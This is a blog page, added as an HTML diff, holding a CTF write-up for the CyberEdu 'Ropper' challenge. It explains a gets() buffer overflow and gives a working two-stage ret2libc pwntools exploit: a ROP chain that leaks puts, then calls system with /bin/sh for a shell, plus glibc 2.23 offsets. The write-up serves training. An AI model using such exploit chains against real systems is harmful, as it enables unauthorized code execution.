@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu Ropper Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Ret2libc">
+<meta name="description" content="Challenge overview
+Your message is at maximum two stages from the flag. Find the bugs in this binary file and you will know what to do.
+
+As the name ropper suggests, and the buffer overflow shown in the image above, we&rsquo;re dealing with a ret2something here.
+Let&rsquo;s take a look at the binary. We have a main and another secondary function being used here.
+
+main calls the second functions and passes, as arguments, the string getting printed and 0.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu Ropper Writeup">
+  <meta property="og:description" content="Challenge overview Your message is at maximum two stages from the flag. Find the bugs in this binary file and you will know what to do.
+As the name ropper suggests, and the buffer overflow shown in the image above, we’re dealing with a ret2something here.
+Let’s take a look at the binary. We have a main and another secondary function being used here.
+main calls the second functions and passes, as arguments, the string getting printed and 0.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-22T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Buffer-Overflow">
+    <meta property="article:tag" content="Ret2libc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu Ropper Writeup">
+<meta name="twitter:description" content="Challenge overview
+Your message is at maximum two stages from the flag. Find the bugs in this binary file and you will know what to do.
+
+As the name ropper suggests, and the buffer overflow shown in the image above, we&rsquo;re dealing with a ret2something here.
+Let&rsquo;s take a look at the binary. We have a main and another secondary function being used here.
+
+main calls the second functions and passes, as arguments, the string getting printed and 0.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu Ropper Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu Ropper Writeup",
+  "name": "CyberEdu Ropper Writeup",
+  "description": "Challenge overview Your message is at maximum two stages from the flag. Find the bugs in this binary file and you will know what to do.\nAs the name ropper suggests, and the buffer overflow shown in the image above, we\u0026rsquo;re dealing with a ret2something here.\nLet\u0026rsquo;s take a look at the binary. We have a main and another secondary function being used here.\nmain calls the second functions and passes, as arguments, the string getting printed and 0.\n",
+  "keywords": [
+    "CyberEdu", "pwn", "buffer-overflow", "Ret2libc"
+  ],
+  "articleBody": "Challenge overview Your message is at maximum two stages from the flag. Find the bugs in this binary file and you will know what to do.\nAs the name ropper suggests, and the buffer overflow shown in the image above, we’re dealing with a ret2something here.\nLet’s take a look at the binary. We have a main and another secondary function being used here.\nmain calls the second functions and passes, as arguments, the string getting printed and 0.\nThe second function calls gets(v3), then fills whatever’s at address unk_601080 with v3.\nIdentifying the vulnerabilities Should the unk_601080 might be something important, we’ll take a look at what we’re overwriting. Seems like .bss data, and it also seems to be empty.\nBut the gets(v3) in our function called by main, without a read amount, which means buffer overflow! We don’t have a win function though.\nSo classic ret2libc, we’re going to make a payload that looks like so, to leak puts’s libc address:\n#padding payload = b\"A\"*256 #rbp payload += b\"R\" *8 main = p64(0x400679) pop_rdi_ret = p64(0x400763) ret = p64(0x4004c9) puts_plt = p64(0x4004e0) puts_got = p64(elf.got['puts']) payload += pop_rdi_ret + puts_got + puts_plt + main p.recvuntil(b\"?\\n\") p.sendline(payload) leak = p.recvline().strip() addr = u64(leak.ljust(8, b\"\\x00\")) print(hex(addr)) Now, since this returns us to main, we can craft another payload, which will execute our system.\n#local puts_offset = 0x585a0 system_offset = 0x2b110 binsh_offset = 0x17fea4 libc = addr - puts_offset system = p64(libc + system_offset) binsh = p64(libc + binsh_offset) payload = b\"A\"*256 #rbp payload += b\"R\" *8 payload += pop_rdi_ret + binsh + ret + system p.recvuntil(b\"?\\n\") p.sendline(payload) p.interactive() Of course, it works locally, but we most likely have to replace the offsets we found with the correct ones, based on the remote glibc version. As expected, we get an EOF, but we can take the leak from the remote binary and find the glibc version using libc.blukat. The version I found was libc6_2.23-0ubuntu10_amd64, and using its offsets, we get the flag!\n#2.23 amd64 puts_offset = 0x06f690 system_offset = 0x045390 binsh_offset = 0x18cd57 As always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "354",
+  "inLanguage": "en",
+  "datePublished": "2025-12-22T00:00:00Z",
+  "dateModified": "2025-12-22T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu Ropper Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-12-22 00:00:00 +0000 UTC'>December 22, 2025</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>Your message is at maximum two stages from the flag. Find the bugs in <strong><a href="https://app.cyber-edu.co/challenges/55a544a0-7f21-11ea-8a5d-9b7c67823f77?tenant=cyberedu">this binary</a></strong> file and you will know what to do.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/ropper-writeup/pic1.png#center"></p>
+<p>As the name <em>ropper</em> suggests, and the buffer overflow shown in the image above, we&rsquo;re dealing with a ret2something here.</p>
+<p>Let&rsquo;s take a look at the binary. We have a <code>main</code> and another secondary function being used here.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/ropper-writeup/pic2.png#center"></p>
+<p><code>main</code> calls the second functions and passes, as arguments, the string getting printed and 0.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/ropper-writeup/pic3.png#center"></p>
+<p>The second function calls <code>gets(v3)</code>, then fills whatever&rsquo;s at address <code>unk_601080</code> with <code>v3</code>.</p>
+<hr>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>Should the <code>unk_601080</code> might be something important, we&rsquo;ll take a look at what we&rsquo;re overwriting. Seems like <code>.bss</code> data, and it also seems to be empty.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/ropper-writeup/pic4.png#center"></p>
+<p>But the <code>gets(v3)</code> in our function called by main, without a read amount, which means buffer overflow! We don&rsquo;t have a win function though.</p>
+<p>So classic <code>ret2libc</code>, we&rsquo;re going to make a payload that looks like so, to leak <code>puts</code>&rsquo;s libc address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#padding</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#rbp</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;R&#34;</span> <span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x400679</span>)
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x400763</span>)
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4004c9</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4004e0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_ret <span style="color:#f92672">+</span> puts_got <span style="color:#f92672">+</span>  puts_plt <span style="color:#f92672">+</span> main
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> u64(leak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>print(hex(addr))
+</span></span></code></pre></div><p>Now, since this returns us to <code>main</code>, we can craft another payload, which will execute our <code>system</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#local</span>
+</span></span><span style="display:flex;"><span>puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x585a0</span>
+</span></span><span style="display:flex;"><span>system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2b110</span>
+</span></span><span style="display:flex;"><span>binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17fea4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> puts_offset
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(libc <span style="color:#f92672">+</span> system_offset)
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> p64(libc <span style="color:#f92672">+</span> binsh_offset)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#rbp</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;R&#34;</span> <span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_ret <span style="color:#f92672">+</span> binsh <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> system 
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/ropper-writeup/pic8.png#center"></p>
+<p>Of course, it works locally, but we most likely have to replace the offsets we found with the correct ones, based on the remote <code>glibc</code> version. As expected, we get an <code>EOF</code>, but we can take the leak from the remote binary and find the <code>glibc</code> version using <code>libc.blukat</code>. The version I found was <code>libc6_2.23-0ubuntu10_amd64</code>, and using its offsets, we get the flag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#2.23 amd64</span>
+</span></span><span style="display:flex;"><span>puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x06f690</span>
+</span></span><span style="display:flex;"><span>system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x045390</span>
+</span></span><span style="display:flex;"><span>binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x18cd57</span>
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/ropper-writeup/pic9.png#center"></p>
+<hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/ropper.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/ret2libc/">Ret2libc</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
